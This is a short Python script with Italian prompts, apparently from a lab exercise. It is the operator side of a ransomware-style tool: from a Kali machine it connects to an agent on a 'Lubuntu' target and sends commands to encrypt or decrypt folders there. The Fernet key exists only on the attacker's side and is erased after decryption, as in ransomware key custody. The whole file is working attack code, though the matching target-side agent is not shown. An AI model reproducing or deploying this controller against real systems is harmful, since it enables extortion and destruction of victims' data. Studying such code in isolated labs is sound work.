import socket
from cryptography.fernet import Fernet
import os

def main():
    target_ip = input("Inserisci IP Lubuntu: ")
    target_port = 8080
    
    # Generazione chiave (esiste solo su Kali)
    key = Fernet.generate_key().decode()
    print(f"[*] Chiave generata per questa sessione: {key}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((target_ip, target_port))
        print("[+] Connesso a Lubuntu.")
        
        while True:
            print("\n1. Cifra Cartella\n2. Decifra Cartella\n3. Esci")
            choice = input("Scegli: ")

            if choice == "1":
                path = input("Inserisci percorso cartella su Lubuntu: ")
                sock.send(f"ENCRYPT|{path}|{key}".encode())
                print(sock.recv(1024).decode())

            elif choice == "2":
                path = input("Inserisci percorso cartella su Lubuntu: ")
                sock.send(f"DECRYPT|{path}|{key}".encode())
                print(sock.recv(1024).decode())
                # Opzionale: cancella la chiave locale
                key = ""
                print("[*] Chiave rimossa da Kali.")

            elif choice == "3":
                break
    finally:
        sock.close()

if __name__ == "__main__":
    main()